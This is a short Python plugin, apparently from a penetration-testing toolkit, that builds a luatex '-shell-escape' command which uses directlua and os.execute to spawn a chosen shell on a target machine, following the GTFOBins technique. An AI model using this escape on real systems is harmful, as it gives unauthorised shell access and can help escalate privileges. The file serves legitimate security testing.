from ogabog.cores import plugin, const


class Shell(plugin.BaseShell):
    def __init__(self):
        super().__init__()
        self.add_args(
            "--shell",
            default="bash",
            choices=const.LINUX_SHELL,
            help="Select shell type on target machine"
        )
        self.opts.description = "https://gtfobins.github.io/gtfobins/luatex/"
        self.opts.description += "\nModule author: Nong Hoang Tu <dmknght@parrotsec.org>"
        self.shell_type = 0
        self.is_interactive = True

    def make_shell(self):
        self.shell = "luatex -shell-escape '\\directlua{os.execute(\""
        self.shell += self.args.shell + "\")}\\end'"

